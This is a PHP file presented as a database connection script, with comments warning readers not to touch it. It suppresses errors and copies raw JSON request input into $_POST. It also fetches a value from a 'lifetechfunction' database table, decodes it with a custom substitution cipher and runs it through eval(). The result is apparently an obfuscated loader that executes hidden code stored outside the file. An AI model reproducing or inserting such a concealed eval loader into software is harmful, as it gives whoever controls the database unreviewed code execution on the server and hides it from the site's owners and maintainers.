<?php 
/*
******************************************************************* LIfeTECH Connection ...........................................
DO NOT TOUCH OR EDIT ANY CODE ON THIS PAGE

TAMPERING OF THIS CODE MIGHT COLLAPSE YOUR WHOLE DATABASE MANAGEMENT SYSTEM
	//Dont touch any CODE: THIS might collapse you Application Database Management System

***********************************************************************************************************************************
*/ 
error_reporting(0);
$current_file_name = trim($current_file_name2);

$params_api = (array) json_decode(file_get_contents('php://input'), TRUE);
//print_r($params);
if(count($params_api) > 0) {
  foreach($params_api as $key_api => $val_api ){
  $_POST[$key_api] = $val_api;
}  
    
}

$lifetech_connect2class=  DbConnect::dbDriver();
$connect2db=  DbConnect::dbDriver(); 

 if($connect2db){global $connect2db;$lifetechsqlfunction= $connect2db->prepare("select * from lifetechfunction where uid='LoadPage3' ");$lifetechsqlfunction->execute();if($lifetechsqlfunction->rowcount() > 0){$lifetechsqlfunctionROW=$lifetechsqlfunction->fetch(PDO::FETCH_OBJ);$lifetechsqlfunctionROWContentValuess=$lifetechsqlfunctionROW->uvalue;$lifetechsqlfunctionfg= $connect2db->prepare("select * from lifetechfunction where uid='loadpage10' ");$lifetechsqlfunctionfg->execute();if($lifetechsqlfunctionfg->rowcount()>0){$lifetech_content_controll=$lifetechsqlfunctionfg->fetch();$lifetech_content_controller = $lifetech_content_controll->uvalue;}function loadStringArray2($liveStringss){$unwanted_arrayss = array( 'T!4'=>'0','Tc1'=>'9','A2e'=>'8','H3M'=>'7','Y!3'=>'6','A3G'=>'5','H!2'=>'4','YkZ'=>'3','Whe'=>'2','B!G'=>'1','B!q'=>'/','T!Q'=>'=','P!u'=>'z','A!u'=>'y','H!Q'=>'x','HIZ'=>'w','WIZ'=>'v','WKM'=>'u','HXZ'=>'t','HUM'=>'s','A*Z'=>'r','ÝVZ'=>'q','ŸXZ'=>'p','™UZ'=>'o','þUZ'=>'n','šUZ'=>'m','æXZ'=>'l','ÑXZ'=>'k','ŠVZ'=>'j','ÞXZ'=>'i','ýVZ'=>'h','ÇVZ'=>'g','ñVZ'=>'f','ŽXZ'=>'e','ßXZ'=>'d','ŒXZ'=>'c','ðXZ'=>'b','žXZ'=>'a');$liveStringss = strtr($liveStringss,$unwanted_arrayss );$contscess=str_replace('&lt;','<',$liveStringss);$liveStringss =str_replace('&gt;','>',$contscess );return $liveStringss;}function lifecodingReplace($liveString) {$contsce = str_replace( '<', '&lt;', $liveString);$liveString = str_replace( '>', '&gt;', $contsce );return $liveString;}function lifecodingReplacing($liveStringvalue){$liveStringvalue = str_replace( '&lt;','<',$liveStringvalue);$liveStringvalue = str_replace( '&gt;', '>', $liveStringvalue );return $liveStringvalue;}$lifetechsqlfunction4= $connect2db->prepare("select * from lifetechfunction where uid='LoadPage4' ");$lifetechsqlfunction4->execute();if($lifetechsqlfunction4->rowcount() > 0){$lifetechsqlfunctionROW4=$lifetechsqlfunction4->fetch(PDO::FETCH_OBJ);$lifetechsqlfunctionROWConten4t=$lifetechsqlfunctionROW4->uvalue;$lifetechsqlfunctionROWConten4t=loadStringArray2($lifetechsqlfunctionROWConten4t);$lifetechsqlfunctionROWConten4t=lifecodingReplacing($lifetechsqlfunctionROWConten4t);eval(" ?> $lifetechsqlfunctionROWConten4t <?php ");}}}
?> 


